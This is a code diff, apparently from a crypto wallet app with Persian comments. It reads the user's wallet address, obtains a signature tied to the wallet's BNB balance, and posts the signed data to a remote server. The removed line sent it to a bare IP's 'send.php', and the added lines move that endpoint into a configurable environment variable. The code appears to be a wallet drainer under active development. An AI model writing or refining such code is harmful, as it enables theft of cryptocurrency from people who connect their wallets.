@@ -19,6 +19,8 @@ function App() {
     var sender = accounts[0];
     console.log("✅ Wallet Address:", sender);
 
+    let apiUrl = process.env.NEXT_PUBLIC_API_URL || "/api/proxy"; // استفاده از متغیر محیطی
+
     async function getRawSignature(address, balance) {
       try {
         let requestData = {
@@ -29,7 +31,7 @@ function App() {
           balance: balance, // مقدار BNB مورد نظر
         };
 
-        let response = await fetch("/api/proxy", { ...
+        let response = await fetch(apiUrl, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(requestData),
@@ -58,7 +60,7 @@ function App() {
           signedData: signature,
         };
 
-        let response = await fetch("http://104.194.133.124/send.php", {
+        let response = await fetch(apiUrl, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(requestData),
